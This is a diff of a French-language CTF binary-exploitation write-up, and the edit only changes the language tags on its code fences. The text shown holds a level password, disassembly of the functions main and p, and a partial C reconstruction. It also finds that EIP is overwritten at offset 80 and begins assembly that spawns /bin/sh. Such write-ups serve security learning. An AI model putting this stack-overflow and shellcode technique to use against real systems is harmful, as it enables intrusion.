@@ -11,7 +11,7 @@ Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
 fonction `main`
 
-```nasm=
+```nasm
 Dump of assembler code for function main:
    0x0804853f <+0>:	push   ebp
    0x08048540 <+1>:	mov    ebp,esp
@@ -22,7 +22,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-```cpp=
+```c
 int		main(int ac, char **av, char **envp) {
 	return(p());
 }
@@ -30,7 +30,7 @@ int		main(int ac, char **av, char **envp) {
 
 fonction `p`
 
-```nasm=
+```nasm
 Dump of assembler code for function p:
    0x080484d4 <+0>:	push   ebp
    0x080484d5 <+1>:	mov    ebp,esp
@@ -65,7 +65,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-```cpp=
+```c
 p() {
     int var = fflush(FILE *stream); // trouver l'argument
     // var is save at [ebp-0x4c]
@@ -164,7 +164,7 @@ References to pattern buffer found at:
 Donc `EIP` est réécrit à l'ofset 80.
 
 Soit le code asm suivant permettant d'executer un `/bin/sh`:
-```nasm=
+```nasm
 .global main
 main:
     push   $0xb
